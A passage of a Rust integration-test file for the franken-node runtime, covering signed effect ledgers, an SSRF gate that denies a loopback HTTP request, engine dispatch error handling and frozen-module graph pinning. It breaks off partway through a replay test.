    // own fs write — proof the readable-stream event path is proof-carrying end to end.
    let ledger = report
        .host_effect_ledger
        .as_ref()
        .expect("native http stream-event run must surface a host-effect ledger");
    assert_eq!(
        ledger.effect_count, 2,
        "expected the http_request egress + the 'end' listener's fs_write, got {:?}",
        ledger.entries
    );
    assert_eq!(ledger.allowed_count, 2);
    assert_eq!(ledger.denied_count, 0);
    let kinds: Vec<&str> = ledger
        .entries
        .iter()
        .map(|entry| entry.receipt.effect_kind.label())
        .collect();
    assert_eq!(
        kinds,
        vec!["http_request", "fs_write"],
        "the egress (main turn) precedes the 'end' listener's fs write (later event-loop turn)"
    );

    // An external auditor re-derives the whole chain offline from the ledger entries.
    let entries_json = serde_json::to_string(&ledger.entries).expect("serialize ledger entries");
    let sdk_entries: Vec<frankenengine_verifier_sdk::bundle::EffectReceiptChainEntry> =
        serde_json::from_str(&entries_json)
            .expect("verifier SDK accepts the run --json ledger wire shape");
    let sdk =
        frankenengine_verifier_sdk::VerifierSdk::new("verifier://bd-3894s-http-event-stream-e2e");
    let verdict = sdk
        .verify_effect_chain_entries(&sdk_entries)
        .expect("verifier SDK re-derives the http + fs effect chain offline");
    assert_eq!(verdict.effect_count, 2);
    assert_eq!(verdict.head_chain_hash, ledger.chain_head_hash);
}

/// bd-656a2 / bd-3894s (http leg, mock-free e2e — DENIED half): the fail-closed
/// counterpart of the allowed e2e. A real `require('http').get('http://127.0.0.1:9/')`
/// program — a loopback endpoint the default-deny SSRF policy blocks, with no
/// config allowlist — run through the PUBLIC `run --json` path is gated BEFORE
/// the socket opens. The denial is surfaced as a signed DENIED `http_request`
/// EffectReceipt in the run --json failure ledger (proof that nothing reached
/// the network), the run fails closed, and the verifier SDK re-derives the chain
/// offline.
///
/// Together with the allowed-half test this is the close-out conjunction for the
/// bd-656a2 http producer: the http.request L1 subject is proof-carrying on BOTH
/// the authorized and the refused path.
#[test]
#[cfg(feature = "engine")]
fn run_surfaces_denied_http_request_effect_ledger_bd_656a2() {
    use frankenengine_node::runtime::effect_receipt::PolicyOutcome;

    // A loopback endpoint the default-deny policy blocks. The SSRF gate denies it
    // before any connection is attempted, so this never reaches the network (no
    // listener is needed and none is bound — the test is hermetic).
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let app_path = create_test_app(
        temp_dir.path(),
        "app.js",
        "require('http').get('http://127.0.0.1:9/');\n",
    );

    // legacy-risky grants network_egress (so the egress hostcall is authorized at
    // the engine layer), but the run uses the DEFAULT [security.network_policy]
    // (Block, no allowlist) — so the product-layer SSRF gate denies loopback.
    let config = Config {
        profile: Profile::LegacyRisky,
        ..Config::default()
    };

    let engine_dir = TempDir::new().expect("Failed to create engine dir");
    let engine_path = create_fixture_engine_binary(engine_dir.path());
    let evidence =
        failure_evidence_via_product_supervisor(&app_path, &config, "legacy-risky", &engine_path)
            .expect("policy-denied http egress must fail closed with signed effect evidence");
    let ledger = &evidence.host_effect_ledger;
    assert_eq!(
        ledger.effect_count, 1,
        "the blocked egress must still produce one (denied) effect, got {:?}",
        ledger.entries
    );
    assert_eq!(
        ledger.denied_count, 1,
        "the egress must be recorded as denied"
    );
    assert_eq!(
        ledger.allowed_count, 0,
        "nothing was authorized to reach the network"
    );

    let receipt = &ledger.entries[0].receipt;
    assert_eq!(
        receipt.effect_kind.label(),
        "http_request",
        "the blocked egress is still an http_request subject"
    );
    assert!(
        matches!(receipt.policy_outcome, PolicyOutcome::Denied { .. }),
        "the receipt must carry a fail-closed Denied outcome, got {:?}",
        receipt.policy_outcome
    );
    // Fail-closed proof: a denied effect has no produced/post state.
    assert!(
        receipt.result_hash.is_none() && receipt.post_state_hash.is_none(),
        "a denied effect must carry no result/post-state (nothing ran)"
    );

    // run --json surfaces the denied receipt.
    let json = serde_json::to_string(ledger).expect("serialize failure ledger as run --json");
    assert!(
        json.contains("\"http_request\"") && json.contains("\"denied\""),
        "the failure ledger must serialize its denied http_request entry: {json}"
    );

    // The verifier SDK re-derives the chain offline — denied receipts are part of
    // the same tamper-evident chain.
    let entries_json = serde_json::to_string(&ledger.entries).expect("serialize ledger entries");
    let sdk_entries: Vec<frankenengine_verifier_sdk::bundle::EffectReceiptChainEntry> =
        serde_json::from_str(&entries_json)
            .expect("verifier SDK accepts the run --json ledger wire shape");
    let sdk = frankenengine_verifier_sdk::VerifierSdk::new("verifier://bd-656a2-http-denied-e2e");
    let verdict = sdk
        .verify_effect_chain_entries(&sdk_entries)
        .expect("verifier SDK re-derives the denied http effect chain offline");
    assert_eq!(verdict.effect_count, 1);
    assert_eq!(verdict.head_chain_hash, ledger.chain_head_hash);
}

#[test]
#[cfg(not(feature = "engine"))]
fn test_strict_profile_rejects_fixture_fallback_without_native_engine() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let app_path = create_test_app(
        temp_dir.path(),
        "strict_test.js",
        r#"console.log("This should not run on strict profile without native engine");"#,
    );

    let engine_path = create_fixture_engine_binary(temp_dir.path());

    let config = Config {
        profile: Profile::Strict, // Strict profile should reject fallback
        ..Config::default()
    };

    let dispatcher =
        EngineDispatcher::new(Some(engine_path.clone()), PreferredRuntime::FrankenEngine);
    // Create test telemetry bridge
    let socket_path = temp_dir.path().join("test-telemetry.sock");
    let adapter = Arc::new(Mutex::new(FrankensqliteAdapter::default()));
    let _telemetry_bridge = TelemetryBridge::new(&socket_path.to_string_lossy(), adapter);
    let policy_mode = config.profile.to_string();

    // Execute and expect failure
    let result = dispatcher.dispatch_run(&app_path, &config, &policy_mode, &[], 0);

    assert!(
        result.is_err(),
        "Strict profile should reject execution without native engine feature"
    );

    let error = result.unwrap_err().to_string();
    assert!(
        error.contains("Native engine required") || error.contains("engine feature"),
        "Error should mention native engine requirement, got: {}",
        error
    );
    assert!(
        error.contains("rebuild") || error.contains("--features engine"),
        "Error should suggest rebuilding with engine feature, got: {}",
        error
    );
}

#[test]
fn test_balanced_profile_allows_external_process_fixture_fallback() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let app_path = create_test_app(
        temp_dir.path(),
        "balanced_test.js",
        r#"console.log("This should run with external process on balanced profile");"#,
    );

    let engine_path = create_fixture_engine_binary(temp_dir.path());

    let config = balanced_config();

    let dispatcher =
        EngineDispatcher::new(Some(engine_path.clone()), PreferredRuntime::FrankenEngine);
    // Create test telemetry bridge
    let socket_path = temp_dir.path().join("test-telemetry.sock");
    let adapter = Arc::new(Mutex::new(FrankensqliteAdapter::default()));
    let _telemetry_bridge = TelemetryBridge::new(&socket_path.to_string_lossy(), adapter);
    let policy_mode = config.profile.to_string();

    // This should succeed by falling back to external process
    let result = dispatcher.dispatch_run(&app_path, &config, &policy_mode, &[], 0);

    // Note: This test may fail if no Node/Bun is available, but that's expected behavior
    // The key is that it shouldn't fail with "native engine required" error
    if let Err(error) = result {
        let error_str = error.to_string();
        assert!(
            !error_str.contains("Native engine required"),
            "Balanced profile should not require native engine, got: {}",
            error_str
        );
        // Other errors (like missing Node/Bun) are acceptable for this test
    }
}

#[test]
#[cfg(feature = "engine")]
fn test_native_engine_error_handling_propagation() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");

    // Test 1: Source file read error
    let nonexistent_path = temp_dir.path().join("nonexistent.js");

    let config = balanced_config();

    // bd-rpo4f: pin an explicit fixture engine placeholder so dispatch
    // resolution succeeds deterministically on every host (previously
    // `None` depended on host PATH/candidate state, and on engine-less
    // machines resolution failed first, masking the source-read error this
    // test asserts — historically via an in-library exit(127) that killed
    // the whole suite). The --engine-bin hint takes precedence over env,
    // config, and candidates, so host state cannot leak in.
    let fixture_engine = create_fixture_engine_binary(temp_dir.path());
    // Create test telemetry bridge
    let socket_path = temp_dir.path().join("test-telemetry.sock");
    let adapter = Arc::new(Mutex::new(FrankensqliteAdapter::default()));
    let _telemetry_bridge = TelemetryBridge::new(&socket_path.to_string_lossy(), adapter);
    let policy_mode = config.profile.to_string();

    let result =
        dispatch_via_product_supervisor(&nonexistent_path, &config, &policy_mode, &fixture_engine);

    assert!(result.is_err(), "Should fail for nonexistent source file");

    let error = result.unwrap_err().to_string();
    assert!(
        error.contains("Failed to read application source")
            || error.contains("No such file or directory")
            || error.contains("cannot find the file"),
        "Error should indicate source read failure, got: {}",
        error
    );

    // Test 2: Invalid source code (this will test engine execution error)
    let invalid_app_path = create_test_app(
        temp_dir.path(),
        "invalid.js",
        r#"this is not valid javascript syntax !@#$%"#,
    );

    let result =
        dispatch_via_product_supervisor(&invalid_app_path, &config, &policy_mode, &fixture_engine);

    // Engine may or may not reject invalid syntax - depends on implementation
    // The key is that errors should propagate properly, not crash
    if let Err(error) = result {
        let error_str = error.to_string();
        // Should not contain panic messages
        assert!(
            !error_str.contains("panic") && !error_str.contains("panicked"),
            "Error should not indicate panic, got: {}",
            error_str
        );
    }
}

/// bd-rpo4f follow-through, same disease as the bd-4f4f0 exit-code sibling
/// below: the external-process dispatch path for the FrankenEngine plan only
/// exists WITHOUT the `engine` feature — with it, execution is native and
/// isolated in a private worker, the slow fixture binary is never spawned, and a fast
/// `console.log` app completes instantly, so `result.is_err()` can never
/// hold. This failure was invisible until bd-rpo4f removed the in-library
/// exit(127) that aborted the suite before this test reported.
#[test]
#[cfg(not(feature = "engine"))]
fn test_engine_timeout_handling_with_fixture_binary() {
    // Set a short timeout for testing (5 seconds instead of default 5 minutes)
    unsafe {
        std::env::set_var("FRANKEN_ENGINE_TIMEOUT_SECS", "5");
    }

    // Clean up the env var when test completes
    struct EnvCleanup(&'static str);
    impl Drop for EnvCleanup {
        fn drop(&mut self) {
            unsafe {
                std::env::remove_var(self.0);
            }
        }
    }
    let _cleanup = EnvCleanup("FRANKEN_ENGINE_TIMEOUT_SECS");

    // Test that dispatcher process handling times out a slow external fixture binary.
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let app_path = create_test_app(
        temp_dir.path(),
        "timeout_test.js",
        r#"console.log("This should timeout before completion");"#,
    );

    // Create a slow fixture engine that takes 10 seconds to complete (longer than our 5s timeout)
    let slow_engine_path = create_slow_fixture_engine_binary(temp_dir.path(), 10);

    let config = balanced_config();

    // Force external process execution by providing explicit engine binary path
    // This bypasses native engine execution to test external process timeout
    let dispatcher = EngineDispatcher::new(
        Some(slow_engine_path.clone()),
        PreferredRuntime::FrankenEngine,
    );
    // Create test telemetry bridge
    let socket_path = temp_dir.path().join("test-telemetry.sock");
    let adapter = Arc::new(Mutex::new(FrankensqliteAdapter::default()));
    let _telemetry_bridge = TelemetryBridge::new(&socket_path.to_string_lossy(), adapter);
    let policy_mode = config.profile.to_string();

    // Execute and measure timing
    let start = std::time::Instant::now();
    let result = dispatcher.dispatch_run(&app_path, &config, &policy_mode, &[], 0);
    let duration = start.elapsed();

    // The execution should fail due to timeout, not complete successfully
    assert!(
        result.is_err(),
        "Slow engine execution should fail due to timeout, but got success"
    );

    let error = result.unwrap_err().to_string();

    // Verify this is actually a timeout error, not some other error
    let is_timeout_error = error.contains("timed out")
        || error.contains("timeout")
        || error.contains("Timeout")
        || error.contains("deadline exceeded");

    // If it's not a timeout error, it might be because the process was killed
    // or failed for another reason, which is also acceptable timeout behavior
    if !is_timeout_error {
        // At minimum, verify the execution was interrupted around our timeout (5s), not after full 10s delay
        assert!(
            duration < Duration::from_secs(7),
            "Execution should be interrupted around timeout limit (~5s), not wait for full 10s completion. Got: {:?}",
            duration
        );

        // And verify the error indicates process failure/interruption
        let is_process_failure = error.contains("failed")
            || error.contains("killed")
            || error.contains("terminated")
            || error.contains("exit");
        assert!(
            is_process_failure,
            "If not a timeout error, should be a process failure error. Got: {}",
            error
        );
    } else {
        // For explicit timeout errors, verify timing was around our 5-second timeout
        assert!(
            duration >= Duration::from_secs(4) && duration <= Duration::from_secs(7),
            "Timeout should occur around 5s mark. Took: {:?}",
            duration
        );
    }

    println!(
        "Timeout test completed in {:?} with error: {}",
        duration, error
    );
}

/// bd-rpo4f: an unavailable requested runtime must surface as a typed,
/// downcastable `Err` from `dispatch_run` — never a `std::process::exit`
/// from library code. Before the fix this exact in-process call terminated
/// the whole test binary with exit 127 mid-suite ("test exited abnormally"),
/// silently skipping every test after it on hosts without a resolvable
/// engine binary. The downcast assertion pins the seam main.rs uses to map
/// this error to the CLI-level exit 127.
#[test]
fn test_requested_runtime_unavailable_returns_typed_error_in_process() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let app_path = create_test_app(
        temp_dir.path(),
        "unavailable_runtime.js",
        r#"console.log("never runs: requested engine is missing");"#,
    );
    // An explicit --engine-bin hint takes precedence over env, config, and
    // candidates, so pointing at a nonexistent path fails resolution
    // deterministically regardless of host state.
    let missing_engine = temp_dir.path().join("missing-franken-engine");
    let config = balanced_config();
    let dispatcher = EngineDispatcher::new(Some(missing_engine), PreferredRuntime::FrankenEngine);

    let result = dispatcher.dispatch_run(&app_path, &config, &config.profile.to_string(), &[], 0);

    let err = result.expect_err("missing requested engine must be an Err, not a process exit");
    let message = err.to_string();
    assert!(
        message.contains("franken-engine") && message.contains("not found"),
        "unavailable-runtime error must stay actionable, got: {message}"
    );
    assert!(
        matches!(
            err.downcast_ref::<DispatchResolutionError>(),
            Some(DispatchResolutionError::RequestedRuntimeUnavailable(_))
        ),
        "CLI boundary must be able to downcast the typed unavailable error"
    );
}

/// bd-4f4f0: requesting `--runtime franken-engine` with a missing engine
/// binary is a fail-closed CLI contract — the process exits 127 with an
/// actionable message. Asserted through the REAL binary in a subprocess
/// because the 127 mapping lives at the CLI boundary in main.rs
/// (bd-rpo4f moved it there; `dispatch_run` itself now returns the typed
/// `DispatchResolutionError::RequestedRuntimeUnavailable` instead of
/// terminating the process). (The old in-process variant passed the
/// invalid policy mode "test" and, since bd-233ja's fail-closed policy-mode
/// validation, asserted on the wrong error entirely.)
#[test]
fn test_native_engine_missing_binary_error_handling() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    create_test_app(
        temp_dir.path(),
        "missing_binary_test.js",
        r#"console.log("This should fail - engine binary missing");"#,
    );

    // Bootstrap a fail-closed-valid workspace exactly as a real operator
    // would (`init` synthesizes trust.registry_signing_key and the other
    // required security defaults so `run` reaches dispatch resolution).
    let init = assert_cmd::Command::cargo_bin("franken-node")
        .expect("franken-node binary")
        .current_dir(temp_dir.path())
        .args(["init", "--profile", "balanced", "--out-dir", "."])
        .output()
        .expect("init command should execute");
    assert!(
        init.status.success(),
        "init must bootstrap the workspace: stderr={}",
        String::from_utf8_lossy(&init.stderr)
    );

    // The CLI rejects absolute user-content paths, so run from the app's
    // directory with relative paths (matching the run-CLI e2e conventions).
    // The --engine-bin hint takes absolute precedence in resolution and is
    // used verbatim, so the missing relative path deterministically fails
    // the existence check regardless of host PATH/candidate state.
    let output = assert_cmd::Command::cargo_bin("franken-node")
        .expect("franken-node binary")
        .current_dir(temp_dir.path())
        .args([
            "run",
            "missing_binary_test.js",
            "--policy",
            "balanced",
            "--runtime",
            "franken-engine",
            "--engine-bin",
            "nonexistent-franken-engine",
        ])
        .output()
        .expect("run command should execute");

    assert_eq!(
        output.status.code(),
        Some(127),
        "a missing requested engine binary must exit 127: stdout={} stderr={}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains("franken-engine") && stderr.contains("not found"),
        "the refusal must name the missing runtime actionably, got: {stderr}"
    );
}

/// bd-4f4f0: the external-process dispatch path for the FrankenEngine plan
/// only exists WITHOUT the `engine` feature — with it, execution is native
/// and in-process, fixture binaries are never spawned, and the old
/// always-compiled variant of this test passed vacuously (it asserted loose
/// wording against an unrelated error). Under `not(engine)`, a fixture
/// engine exiting non-zero is NOT a dispatch error: the run completes and
/// the report surfaces the real exit code fail-visibly.
#[test]
#[cfg(not(feature = "engine"))]
fn test_engine_non_zero_exit_code_fixture_error_handling() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let app_path = create_test_app(
        temp_dir.path(),
        "exit_code_test.js",
        r#"console.log("This should surface the engine exit code");"#,
    );

    // Create a fixture engine that returns exit code 1
    let failing_engine_path = create_failing_fixture_engine_binary(temp_dir.path(), 1);

    let config = balanced_config();
    let dispatcher = EngineDispatcher::new(
        Some(failing_engine_path.clone()),
        PreferredRuntime::FrankenEngine,
    );

    let report = dispatcher
        .dispatch_run(&app_path, &config, "balanced", &[], 0)
        .expect("subprocess dispatch surfaces exit codes in the report, not as errors");

    assert_eq!(report.runtime, "franken_engine");
    assert!(!report.used_fallback_runtime);
    assert_eq!(
        report.exit_code,
        Some(1),
        "the report must carry the fixture engine's real exit code"
    );
    assert!(
        !report.terminated_by_signal,
        "a clean non-zero exit is not a signal termination"
    );
}

/// bd-4f4f0 (see the exit-code variant above for the routing reality): a
/// fixture engine killed by a signal completes the dispatch with no exit
/// code and `terminated_by_signal` set — the abnormal termination is
/// fail-visible in the report rather than smuggled into an error string.
#[test]
#[cfg(not(feature = "engine"))]
fn test_engine_crash_signal_fixture_error_handling() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let app_path = create_test_app(
        temp_dir.path(),
        "crash_test.js",
        r#"console.log("This should surface the engine crash");"#,
    );

    // Create a fixture engine that crashes with SIGKILL
    let crashing_engine_path = create_crashing_fixture_engine_binary(temp_dir.path());

    let config = balanced_config();
    let dispatcher = EngineDispatcher::new(
        Some(crashing_engine_path.clone()),
        PreferredRuntime::FrankenEngine,
    );

    let report = dispatcher
        .dispatch_run(&app_path, &config, "balanced", &[], 0)
        .expect("subprocess dispatch surfaces signal termination in the report");

    assert_eq!(report.runtime, "franken_engine");
    assert!(
        report.terminated_by_signal,
        "SIGKILL termination must be reported as terminated_by_signal"
    );
    assert_eq!(
        report.exit_code, None,
        "a signal-terminated engine has no exit code"
    );
}

#[test]
fn test_dispatcher_creation_and_fixture_configuration() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let engine_path = create_fixture_engine_binary(temp_dir.path());

    // Test various dispatcher configurations
    let dispatcher1 = EngineDispatcher::new(None, PreferredRuntime::Auto);
    let dispatcher2 =
        EngineDispatcher::new(Some(engine_path.clone()), PreferredRuntime::FrankenEngine);
    let dispatcher3 = EngineDispatcher::new(None, PreferredRuntime::Node);

    // Dispatchers should be created successfully
    // This tests the configuration and initialization paths
    assert!(std::mem::size_of_val(&dispatcher1) > 0);
    assert!(std::mem::size_of_val(&dispatcher2) > 0);
    assert!(std::mem::size_of_val(&dispatcher3) > 0);
}

#[test]
#[cfg(all(feature = "engine", unix))]
fn frozen_module_cli_runs_large_npm_source_with_configured_parser_limits() {
    let workspace = TempDir::new().expect("frozen module workspace");
    let package_dir = workspace.path().join("node_modules/frozen-fixture");
    std::fs::create_dir_all(&package_dir).unwrap();
    std::fs::write(
        package_dir.join("package.json"),
        r#"{"name":"frozen-fixture","version":"1.0.0","exports":[null,"./index.js"]}"#,
    ).unwrap();
    std::fs::write(
        package_dir.join("index.js"),
        format!("{}\nmodule.exports=42;\n", ";".repeat(70_000)),
    ).unwrap();
    let app = create_test_app(
        workspace.path(), "app.cjs", "console.log(require('frozen-fixture'));\n",
    );
    let mut config = balanced_config();
    let default = invoke_product_supervisor_with_options(
        &app, &config, "balanced", Path::new(franken_node_bin()), &["--frozen-modules"],
    ).unwrap();
    assert!(!default.status.success(), "default token ceiling must still apply");
    let diagnostics = format!("{}\n{}", default.stdout, default.stderr);
    assert!(diagnostics.contains("ERR_MODULE_ENGINE_PARSE_LIMIT"), "{diagnostics}");

    config.runtime.max_parse_tokens = Some(100_000);
    let admitted = invoke_product_supervisor_with_options(
        &app, &config, "balanced", Path::new(franken_node_bin()), &["--frozen-modules"],
    ).unwrap();
    assert!(admitted.status.success(), "stdout={} stderr={}", admitted.stdout, admitted.stderr);
    let dispatch = parse_product_dispatch(&admitted).unwrap();
    assert_eq!(dispatch.captured_output.stdout, "42\n");
    let decision = dispatch.engine_decision.expect("native engine decision");
    assert_eq!(decision.parser_budget.max_token_count, 100_000);
    let graph = decision.frozen_modules.expect("executed captured graph");
    assert_eq!(graph.modules, 2);
    assert!(graph.routes > 0);
    assert!(!graph.entrypoint.is_empty());
    assert!(!graph.graph_input_hash.is_empty());

    config.runtime.max_parse_source_bytes = Some(1_024);
    let denied = invoke_product_supervisor_with_options(
        &app, &config, "balanced", Path::new(franken_node_bin()), &["--frozen-modules"],
    ).unwrap();
    assert!(!denied.status.success(), "source-byte ceiling must remain independent");
    let diagnostics = format!("{}\n{}", denied.stdout, denied.stderr);
    assert!(diagnostics.contains("ERR_MODULE_ENGINE_PARSE_LIMIT"), "{diagnostics}");
}

#[test]
#[cfg(all(feature = "engine", unix))]
fn frozen_module_graph_pin_binds_native_cjs_and_esm_bytes() {
    use frankenengine_node::supply_chain::module_resolution_graph::file_resolution::source_graph::{
        GraphOptions, capture,
    };

    for (entry_name, entry_source, dependency_name, dependency_source, manifest_type) in [
        (
            "app.js",
            "console.log('PINNED_WORKLOAD_RAN', require('./side.js'));\n",
            "side.js",
            "module.exports=42;\n",
            "commonjs",
        ),
        (
            "app.js",
            "import value from './side.js'; console.log('PINNED_WORKLOAD_RAN', value);\n",
            "side.js",
            "export default 42;\n",
            "module",
        ),
    ] {
        let workspace = TempDir::new().unwrap();
        let app = create_test_app(workspace.path(), entry_name, entry_source);
        let dependency = create_test_app(workspace.path(), dependency_name, dependency_source);
        // .js requires this manifest's type field to determine runtime syntax,
        // so the observed manifest bytes are part of the approved graph.
        let manifest_source = format!(
            "{{\"name\":\"pinned-workload\",\"version\":\"1.0.0\",\"type\":\"{manifest_type}\"}}\n"
        );
        let manifest = create_test_app(workspace.path(), "package.json", &manifest_source);
        // Retain approval before launching the CLI. The worker must not replace
        // this expected value with a digest it derives from later live files.
        let reviewed_pin = capture(workspace.path(), entry_name, GraphOptions::default())
            .unwrap()
            .report()
            .input_hash
            .clone();
        let mut config = balanced_config();
        config.runtime.frozen_modules = Some(true);
        config.runtime.frozen_module_graph_hash = Some(reviewed_pin.clone());
        let approved = invoke_product_supervisor_with_options(
            &app,
            &config,
            "balanced",
            Path::new(franken_node_bin()),
            &[],
        )
        .unwrap();
        assert!(
            approved.status.success(),
            "{}\n{}",
            approved.stdout,
            approved.stderr
        );
        let dispatch = parse_product_dispatch(&approved).unwrap();
        assert_eq!(dispatch.captured_output.stdout, "PINNED_WORKLOAD_RAN 42\n");
        assert_eq!(
            dispatch
                .engine_decision
                .unwrap()
                .frozen_modules
                .unwrap()
                .graph_input_hash,
            reviewed_pin,
        );

        // Each mutation preserves console behavior. Output agreement therefore
        // cannot masquerade as continuity of the reviewed artifact identity.
        for (path, original, changed) in [
            (
                &app,
                entry_source,
                format!("{entry_source}// changed entry bytes\n"),
            ),
            (
                &dependency,
                dependency_source,
                format!("{dependency_source}// changed dependency bytes\n"),
            ),
            (
                &manifest,
                manifest_source.as_str(),
                format!(
                    "{{\"name\":\"pinned-workload\",\"version\":\"2.0.0\",\"type\":\"{manifest_type}\"}}\n"
                ),
            ),
        ] {
            std::fs::write(path, changed).unwrap();
            let stale = invoke_product_supervisor_with_options(
                &app,
                &config,
                "balanced",
                Path::new(franken_node_bin()),
                &[],
            )
            .unwrap();
            assert!(
                !stale.status.success(),
                "stale pin admitted {}",
                path.display()
            );
            let diagnostics = format!("{}\n{}", stale.stdout, stale.stderr);
            assert!(
                diagnostics.contains("ERR_MODULE_REGISTRY_PIN_MISMATCH"),
                "{diagnostics}"
            );
            assert!(
                !diagnostics.contains("PINNED_WORKLOAD_RAN"),
                "{diagnostics}"
            );

            let new_pin = capture(workspace.path(), entry_name, GraphOptions::default())
                .unwrap()
                .report()
                .input_hash
                .clone();
            assert_ne!(new_pin, reviewed_pin);
            let approved_change = invoke_product_supervisor_with_options(
                &app,
                &config,
                "balanced",
                Path::new(franken_node_bin()),
                &["--frozen-module-graph-hash", &new_pin],
            )
            .unwrap();
            assert!(
                approved_change.status.success(),
                "{}\n{}",
                approved_change.stdout,
                approved_change.stderr
            );
            let dispatch = parse_product_dispatch(&approved_change).unwrap();
            assert_eq!(dispatch.captured_output.stdout, "PINNED_WORKLOAD_RAN 42\n");
            assert_eq!(
                dispatch
                    .engine_decision
                    .unwrap()
                    .frozen_modules
                    .unwrap()
                    .graph_input_hash,
                new_pin,
            );
            std::fs::write(path, original).unwrap();
        }
    }
}

#[test]
#[cfg(all(feature = "engine", unix))]
fn frozen_module_graph_pin_does_not_claim_unobserved_manifest_integrity() {
    use frankenengine_node::supply_chain::module_resolution_graph::file_resolution::source_graph::{
        GraphOptions, capture,
    };

    // Retain the exact counterexample from the first native run: explicit
    // .cjs routes need no package type, so an unused root manifest is outside
    // this graph pin. Full artifact metadata authority is a separate obligation.
    let workspace = TempDir::new().unwrap();
    let app = create_test_app(
        workspace.path(),
        "app.cjs",
        "console.log('PINNED_WORKLOAD_RAN', require('./side.cjs'));\n",
    );
    create_test_app(workspace.path(), "side.cjs", "module.exports=42;\n");
    let manifest = create_test_app(
        workspace.path(),
        "package.json",
        "{\"name\":\"pinned-workload\",\"version\":\"1.0.0\"}\n",
    );
    let pin = capture(workspace.path(), "app.cjs", GraphOptions::default())
        .unwrap()
        .report()
        .input_hash
        .clone();
    std::fs::write(
        &manifest,
        "{\"name\":\"pinned-workload\",\"version\":\"2.0.0\"}\n",
    )
    .unwrap();
    assert_eq!(
        capture(workspace.path(), "app.cjs", GraphOptions::default())
            .unwrap()
            .report()
            .input_hash,
        pin,
    );
    let mut config = balanced_config();
    config.runtime.frozen_modules = Some(true);
    config.runtime.frozen_module_graph_hash = Some(pin);
    let output = invoke_product_supervisor_with_options(
        &app,
        &config,
        "balanced",
        Path::new(franken_node_bin()),
        &[],
    )
    .unwrap();
    assert!(
        output.status.success(),
        "{}\n{}",
        output.stdout,
        output.stderr
    );
    assert_eq!(
        parse_product_dispatch(&output)
            .unwrap()
            .captured_output
            .stdout,
        "PINNED_WORKLOAD_RAN 42\n"
    );
}

#[test]
#[cfg(all(feature = "engine", unix))]
fn frozen_module_graph_pin_requires_frozen_execution_and_canonical_hash() {
    let workspace = TempDir::new().unwrap();
    let app = create_test_app(
        workspace.path(),
        "app.cjs",
        "console.log('UNAPPROVED_GUEST_RAN');\n",
    );
    let pin = format!("sha256:{}", "0".repeat(64));
    for (options, expected) in [
        (
            vec!["--frozen-module-graph-hash", pin.as_str()],
            "requires frozen modules",
        ),
        (
            vec![
                "--frozen-modules",
                "--frozen-module-graph-hash",
                "sha256:invalid",
            ],
            "64 lowercase hexadecimal",
        ),
        (
            vec![
                "--frozen-modules",
                "--frozen-module-graph-hash",
                pin.as_str(),
            ],
            "ERR_MODULE_REGISTRY_PIN_MISMATCH",
        ),
    ] {
        let output = invoke_product_supervisor_with_options(
            &app,
            &balanced_config(),
            "balanced",
            Path::new(franken_node_bin()),
            &options,
        )
        .unwrap();
        assert!(!output.status.success());
        let diagnostics = format!("{}\n{}", output.stdout, output.stderr);
        assert!(diagnostics.contains(expected), "{diagnostics}");
        assert!(
            !diagnostics.contains("UNAPPROVED_GUEST_RAN"),
            "{diagnostics}"
        );
    }
}

#[test]
#[cfg(all(feature = "engine", unix))]
fn frozen_module_config_refuses_computed_loads_before_guest_execution() {
    let workspace = TempDir::new().unwrap();
    let app = create_test_app(
        workspace.path(),
        "app.cjs",
        "console.log('FROZEN_GUEST_MUST_NOT_RUN'); const name='./side.cjs'; require(name);",
    );
    create_test_app(workspace.path(), "side.cjs", "module.exports=42;");
    let mut config = balanced_config();
    config.runtime.frozen_modules = Some(true);
    for options in [&[][..], &["--capture-replay"][..]] {
        let output = invoke_product_supervisor_with_options(
            &app,
            &config,
            "balanced",
            Path::new(franken_node_bin()),
            options,
        )
        .unwrap();
        assert!(
            !output.status.success(),
            "uncaptured route must not execute"
        );
        let diagnostics = format!("{}\n{}", output.stdout, output.stderr);
        assert!(
            diagnostics.contains("ERR_MODULE_REGISTRY_INCOMPLETE"),
            "{diagnostics}",
        );
        assert!(
            !diagnostics.contains("FROZEN_GUEST_MUST_NOT_RUN"),
            "{diagnostics}",
        );
    }
}

#[test]
#[cfg(all(feature = "engine", unix))]
fn frozen_modules_capture_and_replay_nested_commonjs_without_live_sources() {
    use frankenengine_node::ops::native_replay::reexecute;
    use sha2::{Digest, Sha256};

    let workspace = TempDir::new().unwrap();
    let package = workspace.path().join("node_modules/captured-nested");
    std::fs::create_dir_all(&package).unwrap();
    std::fs::write(
        package.join("package.json"),
        r#"{"name":"captured-nested","version":"1.0.0","main":"index.cjs"}"#,
    )
    .unwrap();
    std::fs::write(
        package.join("index.cjs"),
        "module.exports=require('./leaf.cjs')+2;",
    )
    .unwrap();
    std::fs::write(package.join("leaf.cjs"), "module.exports=40;").unwrap();
    let app = create_test_app(
        workspace.path(),
        "app.cjs",
        "console.log(require('captured-nested'));\n",
    );
    let initialized = Command::new(franken_node_bin())
        .current_dir(workspace.path())
        .args(["init", "--profile", "balanced", "--out-dir", ".", "--json"])
        .output()
        .unwrap();
    assert!(initialized.status.success(), "{initialized:?}");
    let mut config: Config = toml::from_str(
        &std::fs::read_to_string(workspace.path().join("franken_node.toml")).unwrap(),
    )
    .unwrap();
    config.runtime.frozen_modules = Some(true);
    let output = invoke_product_supervisor_with_options(
        &app,
        &config,
        "balanced",
        Path::new(franken_node_bin()),
        &["--frozen-modules", "--capture-replay"],
    )
    .unwrap();
    assert!(
        output.status.success(),
        "stdout={} stderr={}",
        output.stdout,
        output.stderr,
    );
    let report = parse_product_dispatch(&output).unwrap();
    assert_eq!(report.captured_output.stdout, "42\n");
    let capture = report.native_replay.expect("actual native source capture");
    let payload: serde_json::Value = serde_json::from_str(&capture.payload_json).unwrap();
    assert!(payload["module_sources"].is_object());

    std::fs::rename(&package, workspace.path().join("saved-package")).unwrap();
